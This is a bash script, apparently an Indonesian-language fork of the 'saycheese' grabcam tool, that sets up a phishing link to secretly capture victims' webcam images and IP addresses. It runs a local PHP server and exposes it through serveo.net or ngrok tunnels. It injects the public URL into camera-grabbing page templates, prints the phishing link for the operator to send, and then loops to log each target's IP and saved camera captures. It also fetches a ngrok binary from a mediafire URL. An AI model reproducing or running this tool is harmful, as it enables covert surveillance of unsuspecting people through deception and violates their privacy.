#!/bin/bash
# coded by: github.com/thelinuxchoice/saycheese
# This script modified by Noob Hackers
#@@2222222
# Hearlty thanks for linuxchoice
# If you use any part from this code, giving me the credits. Read the Lincense!
clear
trap 'printf "\n";stop' 2

a="\e[1;30m"
m="\e[1;31m"
k="\e[1;33m"
p="\e[1;37m"
h="\e[1;32m"
r="\e[0m"

banner() {

printf """
\e[1;31m╭────────────────────────────────────────────╮
\e[1;31m│    ⠀⠀⠀⠀⠀⠀\e[1;30m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⣲⠗⠒⡶⠒⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \e[1;31m│
\e[1;31m│    ⠀⠀⠀⠀⠀⠀\e[1;30m⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⢀⣠⠛⠛⠛⠛⠛⡷⠊⠹⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀   \e[1;31m│
\e[1;31m│    ⠀⠀⠀⠀⠀\e[1;30m⢀⣴⣦⡴⠊⢩⣉⣉⡉⢙⣻⢯⠟⠁⠀⠀⠀⠐⠋⢀⡴⠊⢹⡒⠒⠒⠤⡀⠀⠀⠀⠀   \e[1;31m│
\e[1;31m│    ⠀⠀\e[1;30m⠀⢀⣶⣿⡿⢟⠧⠭⢹⣀⡴⡶⠶⠂⡏⠉⠉⠉⠉⠉⠒⡖⠁⠀⠀⠻⢬⣉⣐⣒⣟⠀⠀⠀⠀   \e[1;31m│
\e[1;31m│    ⠀⠀⠀\e[1;30m⡿⣾⣿⡏⠒⠛⠛⠋⠁⢠⡇⠀⠀⠙⠒⣒⠒⠒⠒⠲⠧⠤⠄⠠⠀⠈⠳⡄⠀⣽⣶⡄⠀⠀   \e[1;31m│
\e[1;31m│    ⠀\e[1;30m⠀⢀⠁⣿⡟⢧⣀⠀⠠⠴⠚⠁⣇⣠⣶⣿⣿⣿⣿⣯⣒⢦⡀⠀⠀⠀⡇⠀⠀⢁⠀⢻⣯⣽⡆⠀   \e[1;31m│
\e[1;31m│    ⠀\e[1;30m⠀⣜⣻⡿⠁⢸⠀⠀⠀⢀⣴⣾⣿⣻⡿⢯⣛⠧⢁⠀⠉⠳⣍⢦⠀⡇⢳⠀⠀⣸⠴⢺⣿⣷⣽⡄   \e[1;31m│
\e[1;31m│   \e[1;30m ⢀⣾⣿⠟⠁⠀⢸⠀⢀⣾⣿⣯⠤⠒⠒⠤⡀⠈⠳⣄⠑⣄⢐⡺⣏⢣⣼⣼⣀⠀⢹⠀⠘⠀⣻⣽⠇   \e[1;31m│
\e[1;31m│    \e[1;30m⣾⢼⠁⠀⠀⠀⢸⢀⣾⣿⡟⠁⠀⠀⢀⠀⠀⠀⠀⠘⣧⠘⣇⡪⢽⣾⣧⢹⣾⠀⢸⡆⢰⣿⠟⠁⠀   \e[1;31m│
\e[1;31m│   \e[1;30m ⠘⠮⠿⠶⠶⠿⢻⣾⣿⣿⠁⠀⢠⢳⠃⡟⠁⠘⡄⠀⢸⡆⢱⡺⣕⣿⢻⡟⠁⠀⢸⡇⢸⣿⣦⡀⠀   \e[1;31m│
\e[1;31m│    ⠀⠀⠀⠀⠀\e[1;30m⠀⠈⢿⣿⣿⡄⠀⠈⢟⠧⣈⣉⡴⠃⠀⢸⣇⣼⣾⣿⣯⠏⠀⠀⠀⢸⠓⢹⡿⠟⠁⠀   \e[1;31m│
\e[1;31m│    ⠀⠀⠀⠀⠀⠀⠀\e[1;30m⠈⢻⣿⣿⣄⠀⠀⠙⠒⠂⠀⠀⠀⣸⣼⡿⣿⣭⣁⣀⣀⣀⣀⣼⠶⠋⠁⠀⠀⠀   \e[1;31m│
\e[1;31m│    ⠀⠀⠀⠀⠀⠀⠀⠀⠀\e[1;30m⠹⢿⣿⣷⣶⣶⠆⠀⠀⢀⣴⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \e[1;31m│
\e[1;31m│    ⠀⠀⠀⠀⠀⠀⠀⠀\e[1;30m⠀⠀⠀⠙⠚⠭⠽⠮⠿⠚⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \e[1;31m│
\e[1;31m│ \e[1;31m[ \e[1;37mByexe4Sec! \e[1;31m]      \e[1;30m×     \e[1;31m[ \e[1;37mNoob-Hackers \e[1;31m] \e[1;31m│
╰────────────────────────────────────────────╯\e[0m

"""
printf "\e[1;30m[\e[101m\e[1;32m INFO \e[0m\e[1;30m] \e[1;37mJangan Aktifkan Hotspot\e[1;31m!\n"

printf "\n"
}

stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "${a}[\e[101m${h} IP TERDETEKSI ${r}${a}]${m} >>> %s${p}\n${k}" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "${a}[${m}i${a}]${p} Menunggu Target${a} | ${p}Tekan Ctrl ${m}+${p} C Untuk Keluar${r}\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n${a}[${m}i${a}]${p} Target Membuka Link${r}\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
printf "\n${a}[${m}+${a}]${p} Tangkapan Kamera Target Tersimpan${r}\n"
rm -rf Log.log
fi
sleep 0.5

done 

}


server() {

command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }

printf "${a}[${m}i${a}]${p} Menyiapkan Tunnel Serveo Net...${r}\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &

sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &

sleep 8
fi
printf "${a}[${m}i${a}]${p} Menyiapkan Server PHP...${r}\n"
printf ""
printf "${a}[${m}i${a}]${p} Port Server ${m}:${a} 3333\n"
printf "\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf "${a}[${m}+${a}] ${p}Link Phishing Kamu ${m}:\e[0m${a} %s\n" $send_link

}


payload_ngrok() {

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' grabcam.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php


}

ngrok_server() {


if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1

if [[ -e ngrok+wifi+data.zip ]]; then
unzip ngrok+wifi+data.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok+wifi+data.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi

else
wget https://download2283.mediafire.com/zbyvn6rzvaog/fxrbagkj5bj8d80/ngrok+wifi%2Bdata.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok+wifi+data.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok+wifi+data.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link

payload_ngrok
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "${a}[${m}01${a}] ${p}Serveo Net${m} (${p}Direkomendasikan${m})${r}\n"
printf "${a}[${m}02${a}] ${p}Ngrok${m} (${p}Tidak Direkomendasikan${m})${r}\n"
default_option_server="1"
printf "\n"
printf "${a}[${m}?${a}] ${p}Pilih Layanan Tunneling Yang Akan Digunakan ${m}:${a} "
read option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server -eq 1 ]]; then

command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
start

elif [[ $option_server -eq 2 ]]; then
printf "\n${a}[${m}!${a}] ${p}Tunneling Ini Tidak Bisa Dipakai"
sleep 2
else
printf "${a}[${m}!${a}]${p} Pilihan Gak Valid\n"
sleep 1
clear
start1
fi

}


payload() {

send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

sed 's+forwarding_link+'$send_link'+g' grabcam.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php


}

start() {

default_choose_sub=""
default_subdomain="grabcam$RANDOM"

printf "${a}[${m}i${a}]${p} Silahkan \e[101m${h} ENTER ${r} ${p}Untuk Lanjut"
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "N" || $choose_sub == "n" || $choose_sub == "no" || $choose_sub == "NO" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi

server
payload
checkfound

}

banner
dependencies
start1

